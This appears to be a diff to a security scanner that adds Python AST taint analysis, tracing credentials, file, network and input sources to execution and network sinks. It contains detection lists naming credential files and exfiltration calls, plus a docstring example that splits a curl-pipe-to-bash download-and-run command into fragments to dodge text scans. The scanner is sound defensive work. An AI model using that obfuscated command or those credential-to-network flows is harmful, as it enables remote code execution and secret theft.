@@ -28,6 +28,7 @@ Exit codes: 0 nothing that must block, 1 something that must be looked at, 2 BLO
 from __future__ import annotations
 
 import argparse
+import ast
 import unicodedata
 import re
 import sys
@@ -131,6 +132,201 @@ def fenced_lines(text: str) -> set[int]:
     return inside
 
 
+# ── taint: where an argument came from ────────────────────────────────────────
+#
+# Source and sink lists from SkillSpector's TT1-TT5. The point is the pair, not either
+# end: reading os.environ is normal and posting to a URL is normal, and reading
+# os.environ and posting it is credential exfiltration.
+#
+# The names are matched against the source text of the call as written, so an import
+# alias defeats them. That is a real limit; it is stated rather than discovered.
+
+TAINT_SOURCES = {
+    "credential": ("environ", "getenv", "credential", "secret", "token", "password",
+                   ".netrc", "id_rsa", "keyring"),
+    "file": ("read_text", "readlines", "read()", ".read(", "open("),
+    "network": ("requests.get", "urlopen", "recv(", "socket"),
+    "input": ("sys.argv", "input(", "stdin"),
+}
+
+TAINT_SINKS = {
+    "code execution": ("exec", "eval", "compile", "__import__", "os.system",
+                       "subprocess", "os.popen", "os.exec", "pickle.loads",
+                       "yaml.load", "marshal.loads"),
+    "network output": ("requests.post", "requests.put", "requests.patch", "urlopen",
+                       "socket.send", "http.client", "smtplib", "ftplib", "paramiko"),
+    "file write": ("open(", ".write(", "write_text", "shutil.copy"),
+}
+
+
+def _called(source: str, names: tuple[str, ...]) -> bool:
+    return any(name in source for name in names)
+
+
+def _fold(node: ast.AST) -> str:
+    """The text of an expression with constant string concatenation already folded.
+
+    `"cur" + "l" + " -s http://x | bash"` is a call to curl. A text scan looking for the
+    word sees three fragments and no word; folding first is the entire reason to parse.
+    """
+    try:
+        if isinstance(node, ast.Constant) and isinstance(node.value, str):
+            return node.value
+        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
+            return _fold(node.left) + _fold(node.right)
+        if isinstance(node, ast.JoinedStr):
+            parts = []
+            for value in node.values:
+                if isinstance(value, ast.Constant):
+                    parts.append(str(value.value))
+                elif isinstance(value, ast.FormattedValue):
+                    parts.append(_fold(value.value))
+            return "".join(parts)
+        if isinstance(node, ast.Call):
+            function = _fold(node.func)
+            pieces = [_fold(argument) for argument in node.args]
+            keywords = [f"{keyword.arg}={_fold(keyword.value)}" for keyword in node.keywords
+                        if keyword.arg]
+            return f"{function}({', '.join(pieces + keywords)})"
+        if isinstance(node, ast.Attribute):
+            return f"{_fold(node.value)}.{node.attr}"
+        # A subscript is how credentials are actually read: os.environ["API_KEY"], and
+        # sys.argv[1], and config["token"]. Without this the fold returned an empty
+        # string for the most important source there is, TT3 never fired, and the only
+        # thing that caught the credential was the text pattern for a URL.
+        if isinstance(node, ast.Subscript):
+            return f"{_fold(node.value)}[{_fold(node.slice)}]"
+        if isinstance(node, ast.Name):
+            return node.id
+    except Exception:                                   # noqa: BLE001
+        pass
+    return ""
+
+
+def scan_python_flow(path: Path) -> list[tuple[str, str, int, str]]:
+    """Taint from a source to a sink, and dangerous calls, in one file.
+
+    Intra-procedural and name-based. A flow through an attribute, a closure or a second
+    function is missed, and a file that comes back clean is a file this pass could not
+    follow rather than a file that is safe. It says so in the finding text.
+    """
+    findings: list[tuple[str, str, int, str]] = []
+    try:
+        source = path.read_text(encoding="utf-8", errors="replace")
+        tree = ast.parse(source)
+    except (OSError, SyntaxError):
+        return findings
+
+    # name -> (kinds of source that reached it, whether it went through an auth header)
+    tainted: dict[str, tuple[set[str], bool]] = {}
+
+    HEADER_MARKERS = ("Authorization", "authorization", "X-Api-Key", "x-api-key",
+                      "Bearer", "bearer", "headers", "header", "token=")
+
+    def headerish(node: ast.AST) -> bool:
+        """Did this expression put the value into an authentication header?
+
+        Either directly, or through a name that already carries one. Without the second
+        half, a token put into a headers dict and passed as a request object two lines
+        later looks exactly like a token posted somewhere.
+        """
+        folded = _fold(node)
+        if any(marker in folded for marker in HEADER_MARKERS):
+            return True
+        for name in ast.walk(node):
+            if isinstance(name, ast.Name) and name.id in tainted and tainted[name.id][1]:
+                return True
+        return False
+
+    def kinds_in(node: ast.AST) -> set[str]:
+        """Which sources this expression touches, following names already tainted."""
+        folded = _fold(node)
+        found: set[str] = set()
+        for kind, needles in TAINT_SOURCES.items():
+            if _called(folded, needles):
+                found.add(kind)
+        for name in ast.walk(node):
+            if isinstance(name, ast.Name) and name.id in tainted:
+                found |= tainted[name.id][0]
+        return found
+
+    for node in ast.walk(tree):
+        # assignments propagate taint through the name on the left
+        if isinstance(node, ast.Assign):
+            kinds = kinds_in(node.value)
+            if kinds:
+                through_header = headerish(node.value)
+                for target in node.targets:
+                    for name in ast.walk(target):
+                        if isinstance(name, ast.Name):
+                            before = tainted.get(name.id, (set(), False))
+                            tainted[name.id] = (before[0] | kinds,
+                                                before[1] or through_header)
+        elif isinstance(node, ast.AnnAssign) and node.value is not None:
+            kinds = kinds_in(node.value)
+            if kinds and isinstance(node.target, ast.Name):
+                before = tainted.get(node.target.id, (set(), False))
+                tainted[node.target.id] = (before[0] | kinds,
+                                           before[1] or headerish(node.value))
+
+        if not isinstance(node, ast.Call):
+            continue
+
+        folded = _fold(node)
+        line = getattr(node, "lineno", 0)
+
+        # AST1/AST2/AST5/AST8 - the call itself, after folding
+        for sink_kind, needles in TAINT_SINKS.items():
+            if not _called(folded, needles):
+                continue
+            arrived = set()
+            for argument in list(node.args) + [keyword.value for keyword in node.keywords]:
+                arrived |= kinds_in(argument)
+
+            # TT5, external input to code execution, and TT3, credentials to the network,
+            # are the two that are almost never innocent.
+            if "credential" in arrived and sink_kind == "network output":
+                # Where the credential goes decides what this is. A header named for
+                # authentication, against a host that is not an address literal, is what
+                # an API call looks like - and blocking our own scout for authenticating
+                # to GitHub is how a reader learns to ignore BLOCK.
+                # Either written into a header at the call, or carried there through a
+                # name that was. Both are an API call; neither is proof of innocence.
+                as_header = (any(marker in folded for marker in HEADER_MARKERS)
+                             or any(tainted[name.id][1] for name in ast.walk(node)
+                                    if isinstance(name, ast.Name) and name.id in tainted))
+                if as_header:
+                    findings.append((NOTE, "taint TT3: credential in a request header", line,
+                                     f"{folded[:110]} - expected for an API call; read the "
+                                     f"destination and decide"))
+                else:
+                    findings.append((BLOCK, "taint TT3: credentials to a network sink", line,
+                                     f"{folded[:110]} - an environment variable, secret or "
+                                     f"key reaches a network call outside a header"))
+            elif ("network" in arrived or "input" in arrived) and sink_kind == "code execution":
+                findings.append((BLOCK, "taint TT5: external input to code execution", line,
+                                 f"{folded[:110]} - network or argument data reaches exec, "
+                                 f"eval or a shell"))
+            elif "file" in arrived and sink_kind == "network output":
+                findings.append((REVIEW, "taint TT4: file contents to a network sink", line,
+                                 f"{folded[:110]} - file data reaches a network call"))
+            elif arrived and sink_kind == "code execution":
+                findings.append((REVIEW, "taint TT1/TT2: source reaches code execution", line,
+                                 f"{folded[:110]} - traced from {', '.join(sorted(arrived))}"))
+            elif _called(folded, ("os.system", "os.popen", "subprocess")):
+                # AST5. Unremarkable on its own and worth a glance, because the argument
+                # being a folded constant is exactly the shape this pass exists for.
+                findings.append((NOTE, "ast AST5: shell command", line, folded[:110]))
+            break
+
+    if findings:
+        findings.append((NOTE, "taint: intra-procedural and name-based", 0,
+                         "a flow through an attribute, a closure or a second function is "
+                         "missed; a clean result means this pass could not follow it, not "
+                         "that it is safe"))
+    return findings
+
+
 def scan_file(path: Path) -> list[tuple[str, str, int, str]]:
     """Return (severity, category, line number, text) for everything found."""
     text = path.read_text(encoding="utf-8", errors="replace")
@@ -170,6 +366,11 @@ def scan_file(path: Path) -> list[tuple[str, str, int, str]]:
     # ignore the scanner, and a false injection hit costs one glance.
     hunt(INJECTS, "injection candidate",
          lambda in_code, warning: NOTE if in_code else REVIEW)
+
+    # Python is parsed as well as read. A call assembled from fragments has no word in it
+    # for a text scan to find, and the flow of an argument is invisible to one entirely.
+    if path.suffix.lower() == ".py":
+        findings.extend(scan_python_flow(path))
 
     hidden = INVISIBLE.findall(text)
     if hidden:
